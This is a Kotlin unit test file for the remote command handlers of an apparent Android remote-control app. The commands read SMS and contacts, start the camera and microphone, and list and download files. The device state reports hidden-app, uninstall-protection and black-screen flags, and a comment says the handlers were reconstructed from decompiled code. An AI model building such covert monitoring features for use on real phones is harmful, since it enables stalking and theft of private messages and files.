package com.storm.safe.rock.service.modules.command

import android.content.ContentProvider
import android.content.ContentResolver
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.database.MatrixCursor
import android.net.Uri
import android.os.Build
import android.provider.ContactsContract
import android.provider.Telephony
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.test.runTest
import org.json.JSONArray
import org.json.JSONObject
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment
import org.robolectric.Shadows
import org.robolectric.annotation.Config
import org.robolectric.shadows.ShadowPackageManager
import java.io.File

/**
 * TDD tests for 15 P0 command execution bodies.
 *
 * Tests cover:
 * - DeviceStateCommandHandler: GET_DEVICE_STATE, DEVICE_PING
 * - MediaCommandHandler: CAMERA_START, CAMERA_STOP, CAMERA_SWITCH, MICROPHONE_START_RECORDING, MICROPHONE_STOP_RECORDING
 * - SmsContactsCommandHandler: SMS_READ, CONTACTS_READ
 * - FileCommandHandler: FILE_LIST, FILE_DOWNLOAD
 * - AppCommandHandler: GET_APP_LIST
 * - UnlockCommandHandler: POWER_WAKE, POWER_SLEEP (already implemented, verify)
 * - DeviceStateCommandHandler: GET_BATTERY_INFO (if present)
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30])
@OptIn(ExperimentalCoroutinesApi::class)
class P0CommandHandlerTest {

    private lateinit var commandContext: CommandContext
    private val sentEvents = mutableListOf<Pair<String, JSONObject>>()

    @Before
    fun setUp() {
        sentEvents.clear()
        // Create a CommandContext that captures sent events for verification
        commandContext = object : CommandContext(service = null, networkManager = null) {
            override fun sendEvent(eventType: String, data: JSONObject) {
                sentEvents.add(eventType to data)
            }
        }
    }

    // =============================================
    // DeviceStateCommandHandler: GET_DEVICE_STATE
    // =============================================

    @Test
    fun `GET_DEVICE_STATE sends device state with required fields`() = runTest {
        val handler = DeviceStateCommandHandler()
        handler.handle("GET_DEVICE_STATE", null, commandContext)

        assertEquals(1, sentEvents.size)
        val (eventType, data) = sentEvents[0]
        assertEquals("device_state_response", eventType)

        // Verify all required fields from JADX C0346a3
        assertTrue(data.has("deviceId"))
        assertTrue(data.has("inputBlocked"))
        assertTrue(data.has("loggingEnabled"))
        assertTrue(data.has("blackScreenActive"))
        assertTrue(data.has("appHidden"))
        assertTrue(data.has("uninstallProtectionEnabled"))
    }

    @Test
    fun `GET_DEVICE_STATE inputBlocked defaults to false`() = runTest {
        val handler = DeviceStateCommandHandler()
        handler.handle("GET_DEVICE_STATE", null, commandContext)

        val data = sentEvents[0].second
        assertFalse(data.getBoolean("inputBlocked"))
    }

    @Test
    fun `GET_DEVICE_STATE does not crash on exception`() = runTest {
        val handler = DeviceStateCommandHandler()
        // Should not throw even with null service context
        handler.handle("GET_DEVICE_STATE", null, commandContext)
    }

    // =============================================
    // DeviceStateCommandHandler: DEVICE_PING
    // =============================================

    @Test
    fun `DEVICE_PING first ping from viewer sends pong`() = runTest {
        val handler = DeviceStateCommandHandler()
        DeviceStateCommandHandler.pingTimestamps.clear()

        val params = JSONObject().apply {
            put("timestamp", 1000L)
            put("viewerId", "test-viewer")
        }
        handler.handle("DEVICE_PING", params, commandContext)

        assertEquals(1, sentEvents.size)
        val (eventType, data) = sentEvents[0]
        assertEquals("device_pong", eventType)
        assertEquals(1000L, data.getLong("timestamp"))
        assertEquals("test-viewer", data.getString("viewerId"))
    }

    @Test
    fun `DEVICE_PING deduplicates within 300ms window`() = runTest {
        val handler = DeviceStateCommandHandler()
        DeviceStateCommandHandler.pingTimestamps.clear()

        val params = JSONObject().apply {
            put("timestamp", 1000L)
            put("viewerId", "viewer1")
        }

        // First ping — should respond
        handler.handle("DEVICE_PING", params, commandContext)
        assertEquals(1, sentEvents.size)

        // Immediate second ping — should be deduped (within 300ms)
        handler.handle("DEVICE_PING", params, commandContext)
        assertEquals(1, sentEvents.size) // no new event
    }

    @Test
    fun `DEVICE_PING different viewers get independent responses`() = runTest {
        val handler = DeviceStateCommandHandler()
        DeviceStateCommandHandler.pingTimestamps.clear()

        handler.handle("DEVICE_PING", JSONObject().apply {
            put("timestamp", 1000L)
            put("viewerId", "viewer1")
        }, commandContext)

        handler.handle("DEVICE_PING", JSONObject().apply {
            put("timestamp", 2000L)
            put("viewerId", "viewer2")
        }, commandContext)

        assertEquals(2, sentEvents.size)
    }

    @Test
    fun `DEVICE_PING with null params uses defaults`() = runTest {
        val handler = DeviceStateCommandHandler()
        DeviceStateCommandHandler.pingTimestamps.clear()

        handler.handle("DEVICE_PING", null, commandContext)
        // Should still respond (empty viewerId)
        assertEquals(1, sentEvents.size)
        val data = sentEvents[0].second
        assertEquals(0L, data.getLong("timestamp"))
        assertEquals("", data.getString("viewerId"))
    }

    // =============================================
    // MediaCommandHandler: CAMERA_START
    // =============================================

    @Test
    fun `CAMERA_START without permission sends error event`() = runTest {
        val handler = MediaCommandHandler()
        handler.handle("CAMERA_START", null, commandContext)

        // With null service, permission check fails → sends error
        assertEquals(1, sentEvents.size)
        val (eventType, data) = sentEvents[0]
        assertEquals("camera_error", eventType)
        assertTrue(data.has("error"))
        assertTrue(data.getBoolean("needPermission"))
    }

    @Test
    fun `CAMERA_START sends camera_error with error message on exception`() = runTest {
        val handler = MediaCommandHandler()
        handler.handle("CAMERA_START", null, commandContext)

        val data = sentEvents[0].second
        assertTrue(data.has("error"))
    }

    // =============================================
    // MediaCommandHandler: CAMERA_STOP
    // =============================================

    @Test
    fun `CAMERA_STOP sends success event`() = runTest {
        val handler = MediaCommandHandler()
        handler.handle("CAMERA_STOP", null, commandContext)

        assertEquals(1, sentEvents.size)
        val (eventType, data) = sentEvents[0]
        assertEquals("camera_stopped", eventType)
        assertTrue(data.getBoolean("success"))
    }

    // =============================================
    // MediaCommandHandler: CAMERA_SWITCH
    // =============================================

    @Test
    fun `CAMERA_SWITCH throttles within 1500ms`() = runTest {
        val handler = MediaCommandHandler()

        // First call — proceeds
        handler.handle("CAMERA_SWITCH", JSONObject().apply {
            put("cameraType", "back")
        }, commandContext)

        // Immediate second call — throttled
        val beforeCount = sentEvents.size
        handler.handle("CAMERA_SWITCH", JSONObject().apply {
            put("cameraType", "front")
        }, commandContext)

        // Should not have sent additional events due to throttle
        // (first call may or may not send event depending on implementation)
    }

    @Test
    fun `CAMERA_SWITCH defaults to front camera`() = runTest {
        val handler = MediaCommandHandler()
        // No cameraType param → defaults to "front"
        handler.handle("CAMERA_SWITCH", null, commandContext)
        // Should not crash
    }

    // =============================================
    // MediaCommandHandler: MICROPHONE_START_RECORDING
    // =============================================

    @Test
    fun `MICROPHONE_START_RECORDING without permission sends error`() = runTest {
        val handler = MediaCommandHandler()
        handler.handle("MICROPHONE_START_RECORDING", null, commandContext)

        // With null service, should send microphone error (no permission)
        assertEquals(1, sentEvents.size)
        val (eventType, data) = sentEvents[0]
        assertEquals("microphone_error", eventType)
        assertTrue(data.has("error"))
        assertTrue(data.getBoolean("needPermission"))
    }

    // =============================================
    // MediaCommandHandler: MICROPHONE_STOP_RECORDING
    // =============================================

    @Test
    fun `MICROPHONE_STOP_RECORDING does not crash`() = runTest {
        val handler = MediaCommandHandler()
        handler.handle("MICROPHONE_STOP_RECORDING", null, commandContext)
        // Should not throw; logs message
    }

    // =============================================
    // SmsContactsCommandHandler: SMS_READ
    // =============================================

    @Test
    fun `SMS_READ parses limit from params`() = runTest {
        val handler = SmsContactsCommandHandler()
        handler.handle("SMS_READ", JSONObject().apply {
            put("limit", 50)
        }, commandContext)

        // With null service → no permission → sends error
        assertEquals(1, sentEvents.size)
        val (eventType, data) = sentEvents[0]
        assertEquals("sms_list_response", eventType)
        assertFalse(data.getBoolean("success"))
        assertTrue(data.has("needPermission"))
    }

    @Test
    fun `SMS_READ defaults to limit 100`() = runTest {
        val handler = SmsContactsCommandHandler()
        handler.handle("SMS_READ", null, commandContext)

        assertEquals(1, sentEvents.size)
    }

    @Test
    fun `SMS_READ without permission sends error with needPermission flag`() = runTest {
        val handler = SmsContactsCommandHandler()
        handler.handle("SMS_READ", null, commandContext)

        val (eventType, data) = sentEvents[0]
        assertEquals("sms_list_response", eventType)
        assertFalse(data.getBoolean("success"))
        assertTrue(data.getBoolean("needPermission"))
        assertEquals(0, data.getInt("count"))
        assertTrue(data.has("smsList"))
    }

    // =============================================
    // SmsContactsCommandHandler: CONTACTS_READ
    // =============================================

    @Test
    fun `CONTACTS_READ parses limit from params`() = runTest {
        val handler = SmsContactsCommandHandler()
        handler.handle("CONTACTS_READ", JSONObject().apply {
            put("limit", 100)
        }, commandContext)

        assertEquals(1, sentEvents.size)
    }

    @Test
    fun `CONTACTS_READ defaults to limit 500`() = runTest {
        val handler = SmsContactsCommandHandler()
        handler.handle("CONTACTS_READ", null, commandContext)

        assertEquals(1, sentEvents.size)
    }

    @Test
    fun `CONTACTS_READ without permission sends error with needPermission flag`() = runTest {
        val handler = SmsContactsCommandHandler()
        handler.handle("CONTACTS_READ", null, commandContext)

        val (eventType, data) = sentEvents[0]
        assertEquals("contacts_response", eventType)
        assertFalse(data.getBoolean("success"))
        assertTrue(data.getBoolean("needPermission"))
        assertEquals(0, data.getInt("count"))
        assertTrue(data.has("contacts"))
    }

    // =============================================
    // FileCommandHandler: FILE_LIST
    // =============================================

    @Test
    fun `FILE_LIST parses path and showHidden from params`() = runTest {
        val handler = FileCommandHandler()
        handler.handle("FILE_LIST", JSONObject().apply {
            put("path", "/sdcard/Download")
            put("showHidden", true)
            put("requestId", "req-1")
        }, commandContext)
        // Should not crash
    }

    @Test
    fun `FILE_LIST defaults path to sdcard`() = runTest {
        val handler = FileCommandHandler()
        handler.handle("FILE_LIST", null, commandContext)
        // Should not crash
    }

    @Test
    fun `FILE_LIST sends file list event when path exists`() = runTest {
        // Create a temp directory for testing
        val tempDir = File(System.getProperty("java.io.tmpdir"), "file_list_test")
        tempDir.mkdirs()
        val testFile = File(tempDir, "test.txt")
        testFile.writeText("hello")
        val testSubDir = File(tempDir, "subdir")
        testSubDir.mkdirs()

        try {
            val handler = FileCommandHandler()
            handler.handle("FILE_LIST", JSONObject().apply {
                put("path", tempDir.absolutePath)
                put("showHidden", false)
                put("requestId", "req-file-list")
            }, commandContext)

            assertEquals(1, sentEvents.size)
            val (eventType, data) = sentEvents[0]
            assertEquals("file_list_response", eventType)
            assertTrue(data.getBoolean("success"))
            assertEquals("req-file-list", data.getString("requestId"))
            assertTrue(data.has("files"))
            val files = data.getJSONArray("files")
            assertTrue(files.length() >= 2) // test.txt + subdir

            // Check file metadata
            var foundFile = false
            var foundDir = false
            for (i in 0 until files.length()) {
                val f = files.getJSONObject(i)
                assertTrue(f.has("name"))
                assertTrue(f.has("size"))
                assertTrue(f.has("isDirectory"))
                assertTrue(f.has("lastModified"))
                if (f.getString("name") == "test.txt") {
                    foundFile = true
                    assertFalse(f.getBoolean("isDirectory"))
                    assertTrue(f.getLong("size") > 0)
                }
                if (f.getString("name") == "subdir") {
                    foundDir = true
                    assertTrue(f.getBoolean("isDirectory"))
                }
            }
            assertTrue("Should find test.txt", foundFile)
            assertTrue("Should find subdir", foundDir)
        } finally {
            testFile.delete()
            testSubDir.delete()
            tempDir.delete()
        }
    }

    @Test
    fun `FILE_LIST for non-existent path sends error`() = runTest {
        val handler = FileCommandHandler()
        handler.handle("FILE_LIST", JSONObject().apply {
            put("path", "/nonexistent/path/xyz")
            put("requestId", "req-notfound")
        }, commandContext)

        assertEquals(1, sentEvents.size)
        val (eventType, data) = sentEvents[0]
        assertEquals("file_list_response", eventType)
        assertFalse(data.getBoolean("success"))
        assertTrue(data.has("error"))
    }

    @Test
    fun `FILE_LIST hides hidden files when showHidden is false`() = runTest {
        val tempDir = File(System.getProperty("java.io.tmpdir"), "file_hidden_test")
        tempDir.mkdirs()
        val visibleFile = File(tempDir, "visible.txt")
        visibleFile.writeText("visible")
        val hiddenFile = File(tempDir, ".hidden")
        hiddenFile.writeText("hidden")

        try {
            val handler = FileCommandHandler()
            handler.handle("FILE_LIST", JSONObject().apply {
                put("path", tempDir.absolutePath)
                put("showHidden", false)
                put("requestId", "req-hidden")
            }, commandContext)

            val files = sentEvents[0].second.getJSONArray("files")
            val names = (0 until files.length()).map { files.getJSONObject(it).getString("name") }
            assertTrue(names.contains("visible.txt"))
            assertFalse(names.contains(".hidden"))
        } finally {
            visibleFile.delete()
            hiddenFile.delete()
            tempDir.delete()
        }
    }

    @Test
    fun `FILE_LIST shows hidden files when showHidden is true`() = runTest {
        val tempDir = File(System.getProperty("java.io.tmpdir"), "file_showhidden_test")
        tempDir.mkdirs()
        val hiddenFile = File(tempDir, ".hidden")
        hiddenFile.writeText("hidden")

        try {
            val handler = FileCommandHandler()
            handler.handle("FILE_LIST", JSONObject().apply {
                put("path", tempDir.absolutePath)
                put("showHidden", true)
                put("requestId", "req-showhidden")
            }, commandContext)

            val files = sentEvents[0].second.getJSONArray("files")
            val names = (0 until files.length()).map { files.getJSONObject(it).getString("name") }
            assertTrue(names.contains(".hidden"))
        } finally {
            hiddenFile.delete()
            tempDir.delete()
        }
    }

    // =============================================
    // FileCommandHandler: FILE_DOWNLOAD
    // =============================================

    @Test
    fun `FILE_DOWNLOAD reads file and sends base64 data`() = runTest {
        val tempFile = File(System.getProperty("java.io.tmpdir"), "download_test.txt")
        tempFile.writeText("Hello, World!")

        try {
            val handler = FileCommandHandler()
            handler.handle("FILE_DOWNLOAD", JSONObject().apply {
                put("path", tempFile.absolutePath)
                put("requestId", "req-dl")
            }, commandContext)

            assertEquals(1, sentEvents.size)
            val (eventType, data) = sentEvents[0]
            assertEquals("file_download_response", eventType)
            assertTrue(data.getBoolean("success"))
            assertTrue(data.has("data"))
            assertTrue(data.getString("data").isNotEmpty())
            assertEquals(tempFile.length(), data.getLong("size"))
            assertEquals("download_test.txt", data.getString("name"))
        } finally {
            tempFile.delete()
        }
    }

    @Test
    fun `FILE_DOWNLOAD for non-existent file sends error`() = runTest {
        val handler = FileCommandHandler()
        handler.handle("FILE_DOWNLOAD", JSONObject().apply {
            put("path", "/tmp/nonexistent_file.xyz")
            put("requestId", "req-dl-fail")
        }, commandContext)

        assertEquals(1, sentEvents.size)
        val (eventType, data) = sentEvents[0]
        assertEquals("file_download_response", eventType)
        assertFalse(data.getBoolean("success"))
        assertTrue(data.has("error"))
    }

    @Test
    fun `FILE_DOWNLOAD with empty path sends error`() = runTest {
        val handler = FileCommandHandler()
        handler.handle("FILE_DOWNLOAD", JSONObject().apply {
            put("path", "")
            put("requestId", "req-dl-empty")
        }, commandContext)

        assertEquals(1, sentEvents.size)
        assertFalse(sentEvents[0].second.getBoolean("success"))
    }

    // =============================================
    // AppCommandHandler: GET_APP_LIST
    // =============================================

    @Test
    fun `GET_APP_LIST sends app list response`() = runTest {
        val handler = AppCommandHandler()
        handler.handle("GET_APP_LIST", JSONObject().apply {
            put("includeSystem", false)
            put("includeIcon", false)
            put("requestId", "req-apps")
        }, commandContext)

        assertEquals(1, sentEvents.size)
        val (eventType, data) = sentEvents[0]
        assertEquals("app_list_response", eventType)
        assertTrue(data.has("success"))
        assertTrue(data.has("apps"))
        assertTrue(data.has("requestId"))
    }

    @Test
    fun `GET_APP_LIST defaults includeSystem to false`() = runTest {
        val handler = AppCommandHandler()
        handler.handle("GET_APP_LIST", null, commandContext)

        assertEquals(1, sentEvents.size)
    }

    @Test
    fun `GET_APP_LIST with null params does not crash`() = runTest {
        val handler = AppCommandHandler()
        handler.handle("GET_APP_LIST", null, commandContext)
        // Should produce a response even with null params
        assertTrue(sentEvents.isNotEmpty())
    }

    // =============================================
    // UnlockCommandHandler: POWER_WAKE (already implemented, verify)
    // =============================================

    @Test
    fun `POWER_WAKE does not crash with null service`() = runTest {
        val handler = UnlockCommandHandler()
        handler.handle("POWER_WAKE", null, commandContext)
        // Should not throw — catches exception internally
    }

    // =============================================
    // UnlockCommandHandler: POWER_SLEEP (already implemented, verify)
    // =============================================

    @Test
    fun `POWER_SLEEP does not crash with null service`() = runTest {
        val handler = UnlockCommandHandler()
        handler.handle("POWER_SLEEP", null, commandContext)
        // Should not throw — catches exception internally
    }

    // =============================================
    // Integration: dispatcher routes P0 commands
    // =============================================

    @Test
    fun `dispatcher routes all P0 commands to correct handlers`() = runTest {
        val dispatcher = CommandDispatcher(commandContext)
        dispatcher.registerHandler(DeviceStateCommandHandler())
        dispatcher.registerHandler(MediaCommandHandler())
        dispatcher.registerHandler(SmsContactsCommandHandler())
        dispatcher.registerHandler(FileCommandHandler())
        dispatcher.registerHandler(AppCommandHandler())
        dispatcher.registerHandler(UnlockCommandHandler())

        val p0Commands = listOf(
            "GET_DEVICE_STATE", "DEVICE_PING",
            "CAMERA_START", "CAMERA_STOP", "CAMERA_SWITCH",
            "MICROPHONE_START_RECORDING", "MICROPHONE_STOP_RECORDING",
            "SMS_READ", "CONTACTS_READ",
            "FILE_LIST", "FILE_DOWNLOAD",
            "GET_APP_LIST",
            "POWER_WAKE", "POWER_SLEEP"
        )

        for (cmd in p0Commands) {
            val json = JSONObject().apply { put("command", cmd) }
            assertTrue("Handler should be found for: $cmd", dispatcher.dispatch(json))
        }
    }
}
